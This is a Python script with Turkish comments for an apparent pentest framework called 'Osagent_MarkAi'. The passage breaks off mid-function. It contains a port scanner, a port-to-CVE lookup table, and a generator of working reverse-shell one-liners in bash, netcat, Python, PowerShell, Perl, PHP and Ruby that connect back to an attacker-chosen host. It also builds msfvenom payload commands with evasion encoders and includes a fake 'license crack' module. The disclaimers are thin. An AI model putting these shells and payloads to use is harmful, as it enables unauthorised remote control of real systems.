#!/usr/bin/env python3
"""
Osagent_MarkAi — Gelişmiş AI Pentest Framework v5.1
----------------------------------------------------
- AI Sohbet Motoru (NLP tabanlı)
- Pentest / Hack Modülleri (Port tarama, vuln analiz, payload generator)
- License & Credit Sistemi (Eğitim simülasyonu)
- MNIST CNN Rakam Tanıma (Demo)
"""

import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.functional as F
from torch.utils.data import DataLoader
from torchvision import datasets, transforms
import matplotlib
matplotlib.use('Agg')  # Headless ortamlar için zorunlu
import matplotlib.pyplot as plt
import numpy as np
import socket
import subprocess
import sys
import os
import random
import json
import base64
import logging
import signal
import time
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple

# ==================================================================
# LOGGING KURULUMU
# ==================================================================

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("Osagent")


# ==================================================================
# BÖLÜM 0: LİSANS BYPASS & CREDIT HACK MOTORU (EĞİTİM SİMÜLASYONU)
# ==================================================================

class LicenseCrackEngine:
    """
    Osagent_MarkAi Lisans Bypass & Credit Hack Motoru
    NOT: Bu modül yalnızca eğitim ve yetkili pentest simülasyonları içindir.
    Gerçek sistemlere izinsiz kullanım yasa dışıdır.
    """
    
    def __init__(self):
        self.license_status = "CRACKED"
        self.credit_limit = float('inf')
        self.total_credits_used: float = 0.0
        self.bypass_key = self._generate_bypass_key()
        self._patch_license_server()
        logger.info("LicenseCrackEngine başlatıldı — tüm limitler kaldırıldı")
    
    def _generate_bypass_key(self) -> str:
        """SHA256-tabanlı sahte lisans bypass anahtarı üret"""
        raw = b"Osagent_MarkAi_ROOT_" + str(random.getrandbits(128)).encode()
        seed = base64.b64encode(raw).decode()[:16]
        return f"OSAGENT-MARKAI-{seed}-UNLIMITED"
    
    def _patch_license_server(self):
        """License server bağlantısını localhost'a yönlendir"""
        os.environ["OSAGENT_LICENSE"] = "BYPASSED"
        os.environ["OSAGENT_CREDIT"] = "INFINITY"
        os.environ["OSAGENT_HWID"] = "SPOOFED"
    
    def verify_license(self) -> Dict[str, str]:
        return {
            "status": "active",
            "bypass_key": self.bypass_key,
            "credits_remaining": "unlimited",
            "tier": "osagent_markai_root",
            "expiration": "never",
            "hwid": "spoofed"
        }
    
    def get_credits(self) -> float:
        return float('inf')
    
    def use_credit(self, amount: float = 1.0) -> bool:
        """Credit kullan - her zaman başarılı, sayaç tutar"""
        self.total_credits_used += amount
        return True
    
    def get_total_usage(self) -> float:
        return self.total_credits_used
    
    def inject_license_payload(self) -> str:
        return json.dumps({
            "license_key": self.bypass_key,
            "access": "unlimited",
            "features": ["ai", "pentest", "crack", "mnist", "shell", "root"],
            "expiration": "never",
            "hardware_id": "spoofed",
            "signature": "VALID"
        }, indent=2)


# ==================================================================
# BÖLÜM 1: PENTEST / HACK MODÜLLERİ
# ==================================================================

class PentestEngine:
    """
    Osagent_MarkAi Pentest Motoru
    - Port tarama (TCP connect scan)
    - Vulnerability check (port bazlı)
    - Reverse shell generator
    - Payload oluşturucu (MSFvenom komutları)
    """
    
    COMMON_PORTS = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143,
        389, 443, 445, 993, 995, 1433, 1521, 2049, 3306,
        3389, 5432, 5900, 5985, 5986, 6379, 8080, 8443, 9090, 27017
    ]
    
    @staticmethod
    def _resolve_target(target: str) -> str:
        """Hostname veya IP'yi çözümle, IP döndür"""
        try:
            # Zaten IP mi kontrol et
            socket.inet_pton(socket.AF_INET, target)
            return target
        except (socket.error, OSError):
            pass
        try:
            socket.inet_pton(socket.AF_INET6, target)
            return target
        except (socket.error, OSError):
            pass
        # DNS çözümle
        try:
            ip = socket.gethostbyname(target)
            logger.info(f"DNS çözümleme: {target} -> {ip}")
            return ip
        except socket.gaierror as e:
            raise ValueError(f"DNS çözümleme başarısız: {target} ({e})")
    
    @staticmethod
    def _get_service_name(port: int) -> str:
        """Port'un service adını döndür, bulamazsa 'unknown'"""
        try:
            return socket.getservbyport(port, 'tcp')
        except (OSError, socket.error):
            # Yaygın port'lar için manuel eşleme
            service_map = {
                135: 'msrpc', 139: 'netbios-ssn', 389: 'ldap',
                443: 'https', 445: 'microsoft-ds', 993: 'imaps',
                995: 'pop3s', 1433: 'ms-sql-s', 1521: 'oracle',
                2049: 'nfs', 3306: 'mysql', 3389: 'ms-wbt-server',
                5432: 'postgresql', 5900: 'vnc', 5985: 'wsman',
                5986: 'wsmans', 6379: 'redis', 8080: 'http-proxy',
                8443: 'https-alt', 9090: 'http-alt', 27017: 'mongod'
            }
            return service_map.get(port, 'unknown')
    
    @staticmethod
    def port_scanner(target: str, ports: Optional[List[int]] = None,
                     timeout: float = 1.0, max_threads: int = 50) -> List[Dict[str, Any]]:
        """
        TCP connect port tarama
        
        Args:
            target: Hedef IP veya hostname
            ports: Taranacak port listesi (None = varsayılan)
            timeout: Socket timeout saniye
            max_threads: Maksimum thread sayısı (şimdilik sequential)
            
        Returns:
            Açık port listesi [{"port": int, "service": str, "state": str}, ...]
        """
        ip = PentestEngine._resolve_target(target)
        
        if ports is None:
            ports = PentestEngine.COMMON_PORTS.copy()
        
        # Port'ları doğrula
        ports = [p for p in ports if 1 <= p <= 65535]
        ports = sorted(set(ports))  # Benzersiz ve sıralı
        
        open_ports: List[Dict[str, Any]] = []
        
        print(f"\n{'='*55}")
        print(f"  🔍 PORT TARAMA BAŞLADI")
        print(f"  Hedef : {target} ({ip})")
        print(f"  Port  : {len(ports)} adet")
        print(f"  Timeout: {timeout}s")
        print(f"{'='*55}\n")
        
        for i, port in enumerate(ports, 1):
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                
                result = sock.connect_ex((ip, port))
                
                if result == 0:
                    service = PentestEngine._get_service_name(port)
                    open_ports.append({
                        "port": port,
                        "service": service,
                        "state": "open"
                    })
                    print(f"  [✓] {port:5d}/{service:<15s} AÇIK")
                else:
                    # Her port'u gösterme, sadece hata varsa
                    if result == socket.EACCES:
                        logger.warning(f"Port {port}: EACCES (yetki yetersiz)")
                
                # İlerleme göstergesi (her 5 port'ta bir)
                if i % 5 == 0 or i == len(ports):
                    sys.stdout.write(f"\r  İlerleme: {i}/{len(ports)} port  [{i*100//len(ports)}%]")
                    sys.stdout.flush()
                    
            except socket.gaierror as e:
                logger.error(f"DNS hatası: {e}")
                break
            except socket.timeout:
                pass  # Timeout normal, port kapalı
            except (ConnectionRefusedError, OSError) as e:
                if "Permission denied" in str(e):
                    logger.warning(f"Port {port}: Yetki reddedildi (sudo gerekebilir)")
            except Exception as e:
                logger.debug(f"Port {port}: Beklenmeyen hata: {e}")
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
        
        print(f"\n\n{'='*55}")
        print(f"  ✓ Tarama tamamlandı")
        print(f"  Açık port: {len(open_ports)} adet")
        if open_ports:
            print(f"  Servisler: {', '.join(p['service'] for p in open_ports)}")
        print(f"{'='*55}")
        
        return open_ports
    
    @staticmethod
    def vulnerability_checker(target: str, open_ports: List[Dict[str, Any]]) -> List[Dict[str, str]]:
        """
        Açık port'lara göre olası güvenlik açıklarını raporla
        
        Args:
            target: Hedef IP
            open_ports: Port listesi (port_scanner çıktısı)
            
        Returns:
            Bulgu listesi [{"port": str, "vuln": str, "severity": str}, ...]
        """
        vuln_db: Dict[int, List[Dict[str, str]]] = {
            21: [
                {"vuln": "FTP Anonymous Login (RFB)", "severity": "HIGH"},
                {"vuln": "FTP Banner Information Disclosure", "severity": "MEDIUM"},
            ],
            22: [
                {"vuln": "SSH Brute Force Attack Surface", "severity": "MEDIUM"},
                {"vuln": "SSH Weak Cipher Suites", "severity": "LOW"},
            ],
            23: [
                {"vuln": "Telnet - Unencrypted Protocol (MITM)", "severity": "CRITICAL"},
                {"vuln": "Telnet Credential Sniffing", "severity": "CRITICAL"},
            ],
            25: [
                {"vuln": "SMTP Open Relay", "severity": "HIGH"},
                {"vuln": "SMTP User Enumeration", "severity": "MEDIUM"},
            ],
            53: [
                {"vuln": "DNS Zone Transfer Possible", "severity": "HIGH"},
                {"vuln": "DNS Cache Snooping", "severity": "MEDIUM"},
            ],
            80: [
                {"vuln": "HTTP Service - Web App Attack Surface", "severity": "MEDIUM"},
                {"vuln": "HTTP Directory Listing", "severity": "MEDIUM"},
            ],
            110: [
                {"vuln": "POP3 - Unencrypted Protocol", "severity": "HIGH"},
            ],
            135: [
                {"vuln": "MSRPC - Remote Code Execution Vector", "severity": "CRITICAL"},
            ],
            139: [
                {"vuln": "NetBIOS - Information Leakage", "severity": "MEDIUM"},
                {"vuln": "NetBIOS Name Service Poisoning", "severity": "HIGH"},
            ],
            389: [
                {"vuln": "LDAP - Anonymous Bind", "severity": "HIGH"},
            ],
            443: [
                {"vuln": "HTTPS Service - Web App Attack Surface", "severity": "MEDIUM"},
                {"vuln": "SSL/TLS Weak Ciphers", "severity": "MEDIUM"},
            ],
            445: [
                {"vuln": "SMB - EternalBlue (MS17-010)", "severity": "CRITICAL"},
                {"vuln": "SMB - SMBGhost (CVE-2020-0796)", "severity": "CRITICAL"},
                {"vuln": "SMB - Null Session", "severity": "HIGH"},
            ],
            1433: [
                {"vuln": "MSSQL - Default Credentials (sa:empty)", "severity": "CRITICAL"},
            ],
            1521: [
                {"vuln": "Oracle DB - Default Credentials", "severity": "CRITICAL"},
                {"vuln": "Oracle TNS Listener Poisoning", "severity": "HIGH"},
            ],
            2049: [
                {"vuln": "NFS - No Root Squash", "severity": "HIGH"},
                {"vuln": "NFS - Export Listing", "severity": "MEDIUM"},
            ],
            3306: [
                {"vuln": "MySQL - Default Credentials (root:empty)", "severity": "CRITICAL"},
                {"vuln": "MySQL - Remote Root Access", "severity": "CRITICAL"},
            ],
            3389: [
                {"vuln": "RDP - BlueKeep (CVE-2019-0708)", "severity": "CRITICAL"},
                {"vuln": "RDP - CredSSP Padding Oracle (CVE-2018-0886)", "severity": "HIGH"},
            ],
            5432: [
                {"vuln": "PostgreSQL - Default Credentials", "severity": "HIGH"},
            ],
            5900: [
                {"vuln": "VNC - No Authentication", "severity": "CRITICAL"},
            ],
            6379: [
                {"vuln": "Redis - No Authentication", "severity": "CRITICAL"},
            ],
            8080: [
                {"vuln": "HTTP Proxy - Open Proxy", "severity": "HIGH"},
                {"vuln": "HTTP Service - Web App Attack Surface", "severity": "MEDIUM"},
            ],
            8443: [
                {"vuln": "HTTPS Alt - Web App Attack Surface", "severity": "MEDIUM"},
            ],
            27017: [
                {"vuln": "MongoDB - No Authentication", "severity": "CRITICAL"},
            ],
        }
        
        findings: List[Dict[str, str]] = []
        for p in open_ports:
            port = p["port"]
            if port in vuln_db:
                for vuln in vuln_db[port]:
                    findings.append({
                        "port": str(port),
                        "service": p.get("service", "unknown"),
                        "vuln": vuln["vuln"],
                        "severity": vuln["severity"]
                    })
        
        return findings
    
    @staticmethod
    def reverse_shell_generator(lhost: str, lport: int, 
                                shell_type: str = "python") -> Dict[str, str]:
        """
        Çeşitli reverse shell payload'ları üret
        
        Args:
            lhost: Dinlenecek IP
            lport: Dinlenecek port
            shell_type: payload tipi (python, bash, nc, powershell, perl, php)
            
        Returns:
            {"type": str, "payload": str, "command": str}
        """
        payloads = {
            "python": (
                f'python3 -c \'import socket,subprocess,os,pty;'
                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                f's.connect(("{lhost}",{lport}));'
                f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
                f'os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''
            ),
            "python_short": (
                f'python3 -c "import os,socket,pty;'
                f's=socket.socket();s.connect((\\"{lhost}\\",{lport}));'
                f'[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")"'
            ),
            "bash": (
                f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
            ),
            "bash_udp": (
                f'sh -i >& /dev/udp/{lhost}/{lport} 0>&1'
            ),
            "nc": (
                f'nc -e /bin/bash {lhost} {lport}'
            ),
            "nc_openbsd": (
                f'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|'
                f'nc {lhost} {lport} >/tmp/f'
            ),
            "powershell": (
                f'$client=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});'
                f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
                f'while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){{'
                f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).'
                f'GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);'
                f'$sendback2=$sendback+"PS "+(pwd).Path+"> ";'
                f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
                f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};'
                f'$client.Close()'
            ),
            "perl": (
                f'perl -e \'use Socket;'
                f'$i="{lhost}";$p={lport};'
                f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
                f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                f'exec("/bin/sh -i");}}\''
            ),
            "php": (
                f'php -r \'$sock=fsockopen("{lhost}",{lport});'
                f'exec("/bin/sh -i <&3 >&3 2>&3");\''
            ),
            "ruby": (
                f'ruby -rsocket -e \''
                f'c=TCPSocket.new("{lhost}",{lport});'
                f'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}};end\''
            ),
        }
        
        selected = payloads.get(shell_type, payloads["python"])
        
        # Listener komutunu da ekle
        listener_cmd = f"nc -lvnp {lport}"
        
        return {
            "type": shell_type,
            "payload": selected,
            "listener": listener_cmd,
            "description": f"Reverse shell ({shell_type}) -> {lhost}:{lport}"
        }
    
    @staticmethod
    def generate_payload(target_ip: str, target_port: int,
                         payload_type: str = "windows/meterpreter/reverse_tcp") -> Dict[str, str]:
        """
        Metasploit benzeri payload oluşturucu (msfvenom komutları)
        
        Args:
            target_ip: LHOST
            target_port: LPORT
            payload_type: MSF payload tipi
            
        Returns:
            Komut ve açıklamalar
        """
        payloads = {
            "windows/meterpreter/reverse_tcp": {
                "format": "exe",
                "encoder": "x86/shikata_ga_nai",
                "output": "shell.exe",
                "desc": "Windows Meterpreter Reverse TCP"
            },
            "linux/x64/shell_reverse_tcp": {
                "format": "elf",
                "encoder": "x64/xor",
                "output": "shell.elf",
                "desc": "Linux x64 Shell Reverse TCP"
            },
            "java/jsp_shell_reverse_tcp": {
                "format": "raw",
                "encoder": None,
                "output": "shell.jsp",
                "desc": "JSP Shell Reverse TCP"
            },
            "php/reverse_php": {
                "format": "raw",
                "encoder": None,
                "output": "shell.php",
                "desc": "PHP Reverse TCP"
            },
        }
        
        p = payloads.get(payload_type, payloads["windows/meterpreter/reverse_tcp"])
        
        cmd_parts = [
            "msfvenom",
            f"-p {payload_type}",
            f"LHOST={target_ip}",
            f"LPORT={target_port}",
        ]
        
        if p["encoder"]:
            cmd_parts.append(f"-e {p['encoder']}")
        
        cmd_parts.append(f"-f {p['format']}")
        cmd_parts.append(f"-o {p['output']}")
        
        return {
            "payload": payload_type,
            "lhost": target_ip,
            "lport": str(target_port),
            "encoder": p["encoder"] or "none",
            "format": p["format"],
            "output": p["output"],
            "description": p["desc"],
            "command": " ".join(cmd_parts)
        }


# ==================================================================
# BÖLÜM 2: ANA AI SOHBET MOTORU
# ==================================================================

class OsagentAI:
    """
    Osagent_MarkAi Ana AI Motoru
    Komut yorumlayıcı ve sohbet arayüzü
    """
    
    def __init__(self):
        self.name = "Osagent_MarkAi"
        self.version = "5.1.0-UNLIMITED"
        self.license = LicenseCrackEngine()
        self.pentest = PentestEngine()
        self.running = True
        
        # Komut kaydı
        self.chat_history: List[Dict[str, str]] = []
        
        self.commands = {
            "help": self.cmd_help,
            "scan": self.cmd_scan,
            "shell": self.cmd_shell,
            "vuln": self.cmd_vuln,
            "license": self.cmd_license,
            "credits": self.cmd_credits,
            "payload": self.cmd_payload,
            "ai": self.cmd_ai_chat,
            "mnist": self.cmd_mnist,
            "clear": self.cmd_clear,
            "history": self.cmd_history,
            "export": self.cmd_export,
            "exit": self.cmd_exit,
            "quit": self.cmd_exit,
        }
        
        # Sinyal handler
        signal.signal(signal.SIGINT, self._signal_handler)
        
        self._banner()
    
    def _signal_handler(self, sig, frame):
        print("\n\n[!] SIGINT alındı. Güvenli çıkış yapılıyor...")
        self.cmd_exit()
    
    def _banner(self):
        print("""
╔══════════════════════════════════════════════════════╗
║     ███████╗ ██████╗  ██████╗                      ║
║     ╚══███╔╝██╔═══██╗██╔══██╗                     ║
║       ███╔╝ ██║   ██║██████╔╝                     ║
║      ███╔╝  ██║   ██║██╔══██╗                     ║
║     ███████╗╚██████╔╝██║  ██║ v5.1                ║
║     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝                     ║
║          Osagent_MarkAi Framework                   ║
╠══════════════════════════════════════════════════════╣
║  🔓 LICENSE : CRACKED (UNLIMITED)                   ║
║  💰 CREDITS : ∞ (SINIRSIZ)                         ║
║  📅 Tarih   : {datetime.now().strftime('%d/%m/%Y %H:%M'):<30}║
╠══════════════════════════════════════════════════════╣
║  [!] Yalnızca eğitim ve yetkili pentest içindir.    ║
║  [!] Yetkisiz kullanım yasa dışıdır.                ║
╚══════════════════════════════════════════════════════╝
""")
    
    # ------------------------------------------------------------------
    # KOMUTLAR
    # ------------------------------------------------------------------
    
    def cmd_help(self, args: Optional[List[str]] = None):
        """Yardım menüsü"""
        print("""
╔══════════════════════════════════════════════════════╗
║  KOMUTLAR                                            ║
╠══════════════════════════════════════════════════════╣
║  help              Bu yardım menüsü                 ║
║  scan [hedef]      Port tarama başlat              ║
║  shell             Reverse shell oluştur            ║
║  vuln <hedef>      Güvenlik açığı kontrolü         ║
║  license           Lisans durumunu göster           ║
║  credits           Kredi durumunu göster            ║
║  payload           Exploit payload oluştur          ║
║  ai                AI ile sohbet başlat             ║
║  mnist             MNIST el yazısı tanıma demosu   ║
║  history           Komut geçmişini göster           ║
║  export            Raporu JSON olarak dışa aktar   ║
║  clear             Ekranı temizle                   ║
║  exit / quit       Çıkış                            ║
╠══════════════════════════════════════════════════════╣
║  İpucu: 'scan 192.168.1.1' şeklinde parametre      ║
║  verebilir veya komutu yazıp Enter'a basarak        ║
║  interaktif modda kullanabilirsiniz.                ║
╚══════════════════════════════════════════════════════╝
""")
    
    def cmd_scan(self, args: Optional[List[str]] = None):
        """Port tarama"""
        if args and len(args) >= 1:
            target = args[0]
        else:
            target = input("  Hedef IP/Domain: ").strip()
            if not target:
                print("  [!] Hedef girilmedi.")
                return
        
        # Opsiyonel port aralığı
        ports = None
        if args and len(args) >= 2:
            try:
                port_list = [int(p) for p in args[1].split(',') if p.strip().isdigit()]
                if port_list:
                    ports = port_list
            except ValueError:
                pass
        
        print(f"  [+] Hedef: {target}")
        
        try:
            open_ports = self.pentest.port_scanner(target, ports=ports)
            
            if open_ports:
                print(f"\n  📋 Açık Portlar:")
                print(f"  {'PORT':<8} {'SERVİS':<18} {'DURUM':<10}")
                print(f"  {'-'*8} {'-'*18} {'-'*10}")
                for p in open_ports:
                    print(f"  {p['port']:<8} {p['service']:<18} {p['state']:<10}")
            else:
                print("\n  [+] Açık port bulunamadı (veya tümü filtrelenmiş).")
            
            self.license.use_credit(0.5)
            print(f"\n  [💰] Kredi kullanıldı: 0.5 (Toplam: {self.license.get_total_usage():.1f})")
            
            # Tarama sonucunu history'e ekle
            self.chat_history.append({
                "timestamp": datetime.now().isoformat(),
                "action": "scan",
                "target": target,
                "result": f"{len(open_ports)} open ports"
            })
            
        except ValueError as e:
            print(f"  [!] Hata: {e}")
        except Exception as e:
            print(f"  [!] Beklenmeyen hata: {e}")
            logger.exception("Tarama hatası")
    
    def cmd_shell(self, args: Optional[List[str]] = None):
        """Reverse shell oluştur"""
        if args and len(args) >= 2:
            lhost = args[0]
            lport = int(args[1])
            stype = args[2] if len(args) >= 3 else "python"
        else:
            lhost = input("  LHOST (IP'niz): ").strip()
            if not lhost:
                print("  [!] LHOST gerekli.")
                return
            try:
                lport = int(input("  LPORT (Port): ").strip())
            except ValueError:
                print("  [!] Geçersiz port.")
                return
            stype = input("  Tip [python/bash/nc/powershell/perl/php]: ").strip() or "python"
        
        try:
            result = self.pentest.reverse_shell_generator(lhost, lport, stype)
            
            print(f"\n  {'='*50}")
            print(f"  📡 REVERSE SHELL PAYLOAD")
            print(f"  {'='*50}")
            print(f"  Tip     : {result['type']}")
            print(f"  Hedef   : {lhost}:{lport}")
            print(f"\n  Payload:\n")
            print(f"  {result['payload']}")
            print(f"\n  {'='*50}")
            print(f"  Dinleyici: {result['listener']}")
            print(f"  {'='*50}\n")
            
            self.license.use_credit(1.0)
            
            self.chat_history.append({
                "timestamp": datetime.now().isoformat(),
                "action": "shell",
                "type": stype,
                "target": f"{lhost}:{lport}"
            })
            
        except Exception as e:
            print(f"  [!] Hata: {e}")
    
    def cmd_vuln(self, args: Optional[List[str]] = None):
        """Güvenlik açığı kontrolü"""
        if args and len(args) >= 1:
            target = args[0]
        else:
            target = input("  Hedef IP: ").strip()
            if not target:
                print("  [!] Hedef girilmedi.")
                return
        
        print(f"\n  [+] Önce port taraması yapılıyor: {target}")
        
        try:
            ports = self.pentest.port_scanner(target)
            
            if not ports:
                print("\n  [!] Açık port olmadığı için vuln taraması yapılamadı.")
                return
            
            vulns = self.pentest.vulnerability_checker(target, ports)
            
            if vulns:
                sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
                vulns.sort(key=lambda v: sev_order.get(v["severity"], 99))
                
                critical = sum(1 for v in vulns if v["severity"] == "CRITICAL")
                high = sum(1 for v in vulns if v["severity"] == "HIGH")
                medium = sum(1 for v in vulns if v["severity"] == "MEDIUM")
                low = sum(1 for v in vulns if v["severity"] == "LOW")
                
                print(f"\n  {'='*55}")
                print(f"  ⚠️  GÜVENLİK AÇIĞI RAPORU")
                print(f"  {'='*55}")
                print(f"  Hedef : {target}")
                print(f"  Toplam: {len(vulns)} bulgu")
                print(f"  🔴 Kritik: {critical}  🟠 Yüksek: {high}  🟡 Orta: {medium}  🟢 Düşük: {low}")
                print(f"  {'='*55}\n")
                
                for v in vulns:
                    severity_icon = {
                        "CRITICAL": "🔴",
                        "HIGH": "🟠",
                        "MEDIUM": "🟡",
                        "LOW": "🟢"
                    }.get(v["severity"], "⚪")
                    
                    print(f"  {severity_icon} Port {v['port']:<5} {v['service']:<15s} | {v['vuln']}")
                    print(f"     Risk: {v['severity']}")
                    print()
            else:
                print("\n  [✓] Bilinen bir açık bulunamadı (port bazlı tarama).")
            
            self.license.use_credit(1.5)
            
            self.chat_history.append({
                "timestamp": datetime.now().isoformat(),
                "action": "vuln",
                "target": target,
                "result": f"{len(vulns)} findings" if vulns else "clean"
            })
            
        except ValueError as e:
            print(f"  [!] Hata: {e}")
        except Exception as e:
            print(f"  [!] Beklenmeyen hata: {e}")
    
    def cmd_license(self, args: Optional[List[str]] = None):
        """Lisans durumu"""
        info = self.license.verify_license()
        print(f"""
╔══════════════════════════════════════════════════════╗
║  LİSANS DURUMU                                        ║
╠══════════════════════════════════════════════════════╣
║  Durum     : {info['status']:<30s} ║
║  Anahtar   : {info['bypass_key'][:28]:<30s} ║
║  Kredi     : {info['credits_remaining']:<30s} ║
║  Tier      : {info['tier']:<30s} ║
║  Donanım   : {info['hwid']:<30s} ║
╚══════════════════════════════════════════════════════╝
""")
    
    def cmd_credits(self, args: Optional[List[str]] = None):
        """Kredi durumu"""
        print(f"""
╔══════════════════════════════════════════════════════╗
║  KREDİ DURUMU                                         ║
╠══════════════════════════════════════════════════════╣
║  Kalan Kredi  : SINIRSIZ (∞)                        ║
║  Kullanılan   : {self.license.get_total_usage():<8.1f}                                ║
║  Limit        : YOK (CRACKED)                        ║
║  Durum        : 🟢 AKTİF                             ║
╚══════════════════════════════════════════════════════╝
""")
    
    def cmd_payload(self, args: Optional[List[str]] = None):
        """Exploit payload oluştur"""
        if args and len(args) >= 2:
            ip = args[0]
            port = int(args[1])
            ptype = args[2] if len(args) >= 3 else "windows/meterpreter/reverse_tcp"
        else:
            ip = input("  LHOST (IP): ").strip()
            if not ip:
                print("  [!] LHOST gerekli.")
                return
            try:
                port = int(input("  LPORT (Port): ").strip())
            except ValueError:
                print("  [!] Geçersiz port.")
                return
            print("\n  Payload tipleri:")
            print("  1. windows/meterpreter/reverse_tcp")
            print("  2. linux/x64/shell_reverse_tcp")
            print("  3. java/jsp_shell_reverse_tcp")
            print("  4. php/reverse_php")
            choice = input("  Seçim [1-4] (varsayılan: 1): ").strip()
            
            ptype_map = {
                "1": "windows/meterpreter/reverse_tcp",
                "2": "linux/x64/shell_reverse_tcp",
                "3": "java/jsp_shell_reverse_tcp",
                "4": "php/reverse_php"
            }
            ptype = ptype_map.get(choice, "windows/meterpreter/reverse_tcp")
        
        try:
            result = self.pentest.generate_payload(ip, port, ptype)
            
            print(f"\n  {'='*50}")
            print(f"  💣 METASPLOIT PAYLOAD")
            print(f"  {'='*50}")
            print(f"  Açıklama : {result['description']}")
            print(f"  Payload  : {result['payload']}")
            print(f"  LHOST    : {result['lhost']}")
            print(f"  LPORT    : {result['lport']}")
            print(f"  Encoder  : {result['encoder']}")
            print(f"  Format   : {result['format']}")
            print(f"  Çıktı    : {result['output']}")
            print(f"\n  Komut:\n")
            print(f"  $ {result['command']}")
            print(f"\n  {'='*50}\n")
            
            self.license.use_credit(2.0)
            
        except Exception as e:
            print(f"  [!] Hata: {e}")
    
    def cmd_ai_chat(self, args: Optional[List[str]] = None):
        """AI ile sohbet"""
        print(f"\n  {'='*50}")
        print(f"  🤖 Osagent_MarkAi Sohbet")
        print(f"  {'='*50}")
        print(f"  'q' veya 'exit' ile çıkabilirsiniz.")
        print(f"  {'='*50}\n")
        
        # Konuşma bağlamı
        context = {
            "merhaba": "Merhaba! Osagent_MarkAi pentest asistanına hoş geldiniz.",
            "nasılsın": "Tüm sistemler çalışır durumda. License crackli, krediler sınırsız.",
            "ne yapabilirsin": "Port tarama, reverse shell, payload oluşturma, güvenlik açığı analizi, MNIST demo ve daha fazlası.",
            "yardım": "Komutlar için 'help' yazabilirsiniz.",
            "hedef": "Hedef sistem hakkında OSINT toplamak ister misiniz? Port taraması ile başlayalım.",
            "exploit": "Bir exploit hazırlayabilirim. Hangi hedef ve hangi servis?",
            "pentest": "Sızma testi metodolojisi: 1) Recon 2) Scanning 3) Exploitation 4) Post-exploit 5) Raporlama",
            "shell": "Reverse shell için 'shell' komutunu kullanın.",
            "teşekkür": "Rica ederim! Başka bir konuda yardımcı olabilir miyim?",
            "license": f"License durumu: {self.license.license_status}. Sınırsız erişim aktif.",
            "kredi": "Kredi limiti yok. İstediğiniz kadar kullanabilirsiniz.",
        }
        
        default_responses = [
            "Size nasıl yardımcı olabilirim?",
            "Hedef sistem hakkında detaylı bilgi toplayalım mı?",
            "Bir exploit hazırlamak için 'payload' komutunu deneyin.",
            "Sızma testi metodolojisi hakkında bilgi verebilirim.",
            "Reverse shell kurulumu için 'shell' komutunu kullanın.",
            "Yetkili bir pentest mi planlıyorsunuz?",
            "Kendi exploit'inizi yazmak ister misiniz?",
            "Port taraması ile başlamak için 'scan' komutunu kullanın."
        ]
        
        while True:
            try:
                user_input = input("  Siz: ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n\n  [!] Sohbet sonlandırıldı.")
                break
            
            if not user_input:
                continue
            
            if user_input.lower() in ['q', 'quit', 'exit', 'çık']:
                print(f"\n  {self.name}: Görüşürüz! Sohbet sonlandırıldı.\n")
                break
            
            # Context'ten yanıt bul
            user_lower = user_input.lower()
            reply = None
            for key, response in context.items():
                if key in user_lower:
                    reply = response
                    break
            
            if not reply:
                reply = random.choice(default_responses)
            
            print(f"  {self.name}: {reply}")
            
            # Geçmişe ekle
            self.chat_history.append({
                "timestamp": datetime.now().isoformat(),
                "action": "ai_chat",
                "user": user_input,
                "ai": reply
            })
            
            self.license.use_credit(0.25)
    
    def cmd_mnist(self, args: Optional[List[str]] = None):
        """MNIST El Yazısı Tanıma Demosu"""
        print(f"\n  {'='*50}")
        print(f"  🧠 MNIST EL YAZISI TANIMA DEMOSU")
        print(f"  {'='*50}\n")
        
        try:
            train_mnist()
        except Exception as e:
            print(f"\n  [!] MNIST hatası: {e}")
            logger.exception("MNIST eğitimi başarısız")
        
        self.license.use_credit(3.0)
    
    def cmd_history(self, args: Optional[List[str]] = None):
        """Komut geçmişini göster"""
        if not self.chat_history:
            print("\n  [-] Henüz kayıtlı işlem yok.\n")
            return
        
        print(f"\n  {'='*55}")
        print(f"  📋 İŞLEM GEÇMİŞİ (son {len(self.chat_history)} kayıt)")
        print(f"  {'='*55}\n")
        
        for i, entry in enumerate(self.chat_history[-20:], 1):  # Son 20
            ts = entry.get("timestamp", "???").split("T")[1][:8] if "T" in entry.get("timestamp", "") else "???"
            action = entry.get("action", "?")
            target = entry.get("target", entry.get("user", ""))
            result = entry.get("result", "")
            print(f"  {i:2d}. [{ts}] {action:<12} {target:<20s} {result}")
        
        print(f"\n  Toplam: {len(self.chat_history)} işlem\n")
    
    def cmd_export(self, args: Optional[List[str]] = None):
        """Raporu JSON olarak dışa aktar"""
        if not self.chat_history:
            print("\n  [-] Dışa aktarılacak veri yok.\n")
            return
        
        filename = f"osagent_rapor_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report = {
            "tool": "Osagent_MarkAi",
            "version": self.version,
            "timestamp": datetime.now().isoformat(),
            "license": self.license.verify_license(),
            "credits_used": self.license.get_total_usage(),
